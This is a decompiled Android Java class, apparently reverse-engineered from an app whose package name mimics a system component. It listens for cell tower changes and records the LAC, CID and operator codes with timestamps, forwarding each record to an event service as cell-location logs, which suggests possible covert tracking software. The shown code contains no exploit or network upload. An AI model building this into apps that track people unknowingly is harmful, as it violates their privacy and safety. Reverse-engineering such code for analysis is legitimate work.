package com.app.system.common;

import android.content.Context;
import android.content.Intent;
import android.telephony.CellIdentityGsm;
import android.telephony.CellInfo;
import android.telephony.CellInfoCdma;
import android.telephony.CellInfoGsm;
import android.telephony.CellInfoLte;
import android.telephony.CellInfoWcdma;
import android.telephony.CellLocation;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.telephony.cdma.CdmaCellLocation;
import android.telephony.gsm.GsmCellLocation;
import com.app.system.common.service.EventsAndReceiveService;
import com.security.b;
import java.util.Date;
import java.util.Iterator;
import java.util.List;

public class f
{
  private static f a;
  private Context b;
  private boolean c = false;
  
  private a a(CellInfo paramCellInfo)
  {
    if ((paramCellInfo != null) && (!(paramCellInfo instanceof CellInfoCdma)))
    {
      if ((paramCellInfo instanceof CellInfoGsm))
      {
        paramCellInfo = ((CellInfoGsm)paramCellInfo).getCellIdentity();
        return new a(paramCellInfo.getLac(), paramCellInfo.getCid());
      }
      if (!(paramCellInfo instanceof CellInfoLte)) {
        boolean bool = paramCellInfo instanceof CellInfoWcdma;
      }
    }
    return null;
  }
  
  private a a(CellLocation paramCellLocation)
  {
    if (paramCellLocation != null)
    {
      if ((paramCellLocation instanceof GsmCellLocation))
      {
        paramCellLocation = (GsmCellLocation)paramCellLocation;
        return new a(paramCellLocation.getLac(), paramCellLocation.getCid());
      }
      boolean bool = paramCellLocation instanceof CdmaCellLocation;
    }
    return null;
  }
  
  public static f a()
  {
    if (a == null) {
      a = new f();
    }
    return a;
  }
  
  private void a(CellLocation paramCellLocation, boolean paramBoolean)
  {
    paramCellLocation = a(paramCellLocation);
    if (paramCellLocation != null)
    {
      paramCellLocation.a(b());
      com.security.d.a.d("PhoneState", String.format("NEW CELL: LAC=%d, CID=%d, MCC=%d, MNC=%d", new Object[] { Integer.valueOf(paramCellLocation.a), Integer.valueOf(paramCellLocation.b), Integer.valueOf(paramCellLocation.c), Integer.valueOf(paramCellLocation.d) }), new Object[0]);
      if (paramBoolean) {
        a(new Date(), paramCellLocation);
      }
    }
  }
  
  private void a(Date paramDate, a parama)
  {
    Intent localIntent = new Intent(this.b, EventsAndReceiveService.class);
    localIntent.putExtra("event_core_app", "event_cell_info_log");
    localIntent.putExtra("dateTime", paramDate.getTime());
    localIntent.putExtra("LAC", parama.a);
    localIntent.putExtra("CID", parama.b);
    localIntent.putExtra("MCC", parama.c);
    localIntent.putExtra("MNC", parama.d);
    com.b.a.a.a.a(this.b, localIntent);
  }
  
  private void a(List<CellInfo> paramList, boolean paramBoolean)
  {
    if (paramList != null)
    {
      b localb = b();
      Iterator localIterator = paramList.iterator();
      while (localIterator.hasNext())
      {
        paramList = a((CellInfo)localIterator.next());
        if (paramList != null)
        {
          paramList.a(localb);
          com.security.d.a.d("PhoneState", String.format("NEW CELL: LAC=%d, CID=%d, MCC=%d, MNC=%d", new Object[] { Integer.valueOf(paramList.a), Integer.valueOf(paramList.b), Integer.valueOf(paramList.c), Integer.valueOf(paramList.d) }), new Object[0]);
          if (paramBoolean) {
            a(new Date(), paramList);
          }
        }
      }
    }
  }
  
  private b b()
  {
    String str = ((TelephonyManager)this.b.getSystemService("phone")).getNetworkOperator();
    b localb = new b(null);
    if (str != null)
    {
      if (str.length() >= 3) {
        localb.a = Integer.parseInt(str.substring(0, 3));
      }
      if (str.length() > 3) {
        localb.b = Integer.parseInt(str.substring(3));
      }
    }
    return localb;
  }
  
  public void a(Context paramContext)
  {
    this.b = paramContext;
    TelephonyManager localTelephonyManager = (TelephonyManager)paramContext.getSystemService("phone");
    try
    {
      if (b.a(paramContext, "android.permission.ACCESS_COARSE_LOCATION", "init@PhoneState.java"))
      {
        this.c = true;
        a(localTelephonyManager.getCellLocation(), false);
      }
    }
    catch (SecurityException paramContext)
    {
      com.security.d.a.a("PhoneState", "Can't get cell location", new Object[] { paramContext });
    }
    int i;
    if (this.c) {
      i = 16;
    } else {
      i = 1024;
    }
    localTelephonyManager.listen(new c(null), i);
  }
  
  private class a
  {
    public int a;
    public int b;
    public int c;
    public int d;
    
    public a(int paramInt1, int paramInt2)
    {
      this.a = paramInt1;
      this.b = paramInt2;
      this.c = 0;
      this.d = 0;
    }
    
    public void a(f.b paramb)
    {
      this.c = paramb.a;
      this.d = paramb.b;
    }
  }
  
  private class b
  {
    public int a = 0;
    public int b = 0;
    
    private b() {}
  }
  
  private class c
    extends PhoneStateListener
  {
    private c() {}
    
    public void onCellInfoChanged(List<CellInfo> paramList)
    {
      f.a(f.this, paramList, true);
    }
    
    public void onCellLocationChanged(CellLocation paramCellLocation)
    {
      f.a(f.this, paramCellLocation, true);
    }
  }
}


/* Location:              ~/com/app/system/common/f.class
 *
 * Reversed by:           J
 */